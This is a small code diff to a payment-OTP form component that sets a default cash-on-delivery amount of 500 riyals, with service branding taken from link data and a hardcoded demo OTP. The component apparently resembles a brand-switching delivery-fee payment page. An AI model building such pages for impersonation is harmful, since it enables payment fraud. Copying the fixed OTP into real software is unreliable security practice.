@@ -29,7 +29,7 @@ const PaymentOTPForm = () => {
   const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = (shippingInfo?.cod_amount || 0) > 0 ? shippingInfo.cod_amount : 500;
   const formattedAmount = `${amount} ر.س`;
   
   // Demo OTP: 123456
